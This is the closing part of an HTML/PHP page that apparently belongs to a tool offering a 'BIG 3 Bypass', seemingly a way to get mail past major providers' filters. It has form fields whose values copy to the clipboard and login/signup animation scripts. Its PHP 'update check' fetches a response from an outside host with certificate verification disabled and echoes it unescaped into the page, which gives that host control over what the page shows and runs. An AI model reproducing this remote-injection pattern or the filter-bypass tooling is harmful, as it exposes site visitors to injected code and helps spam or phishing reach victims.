<label for="username">Subject</label>
<input class="form-styling" id="Subject" type="text" name="Subject" value="">
<br>
<script>
function redirea(){
window.location.href = "?big=three";
}
</script>
<a id="buta" onclick="redirea()" style="float: left;font-weight: 700;text-transform: uppercase;font-size: 13px;text-align: center;color: rgb(249, 249, 249);padding-top: 8px;width: 100%;height: 35px;border: none;border-radius: 20px;margin-top: 23px;background-color: rgb(14, 14, 14);left: 0px;top: 0px;transition: all .5s ease, top .5s ease .5s, height .5s ease .5s, background-color .5s ease .75s;cursor: pointer;">Use BIG 3 Bypass 🙃</a>

<script>
document.getElementById("mega").onclick = function() {
  this.select();
  document.execCommand('copy');
new Noty({
	layout: 'bottomRight',
	type: 'info',
    text: 'Copied to your keyboard',
	timeout: 2000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}
document.getElementById("Subdomain").onclick = function() {
  this.select();
  document.execCommand('copy');
new Noty({
	layout: 'bottomRight',
	type: 'info',
    text: 'Copied to your keyboard',
	timeout: 2000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}
document.getElementById("Domain").onclick = function() {
  this.select();
  document.execCommand('copy');
new Noty({
	layout: 'bottomRight',
	type: 'info',
    text: 'Copied to your keyboard',
	timeout: 2000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}
document.getElementById("Subject").onclick = function() {
  this.select();
  document.execCommand('copy');
new Noty({
	layout: 'bottomRight',
	type: 'info',
    text: 'Copied to your keyboard',
	timeout: 2000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}
</script>

</form>

</a>
</div>
<script src="https://static.codepen.io/assets/common/stopExecutionOnTimeout-de7e2ef6bfefd24b79a3f68b414b87b8db5b08439cac3f1012092b2290c719cd.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.3.14/angular.min.js"></script>
<script id="rendered-js">
      $(function () {
  $(".btn").click(function () {
    $(".form-signin").toggleClass("form-signin-left");
    $(".form-signup").toggleClass("form-signup-left");
    $(".frame").toggleClass("frame-long");
    $(".signup-inactive").toggleClass("signup-active");
    $(".signin-active").toggleClass("signin-inactive");
    $(".forgot").toggleClass("forgot-left");
    $(this).removeClass("idle").addClass("active");
  });
});



$(function () {
  $(".btn-signin").click(function () {
    $(".btn-animate").toggleClass("btn-animate-grow");
    $(".welcome").toggleClass("welcome-left");
    $(".cover-photo").toggleClass("cover-photo-down");
    $(".frame").toggleClass("frame-short");
    $(".profile-photo").toggleClass("profile-photo-down");
    $(".btn-goback").toggleClass("btn-goback-up");
    $(".forgot").toggleClass("forgot-fade");
  });
});

    </script>

<?php
$vis = '1.3';
// to check for update
$url = "https://highwall.space/status/update.php";
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if (strpos($result,$vis) !== false )
        { 
		}else{ echo "$result";
		}
?>
</body>

</html>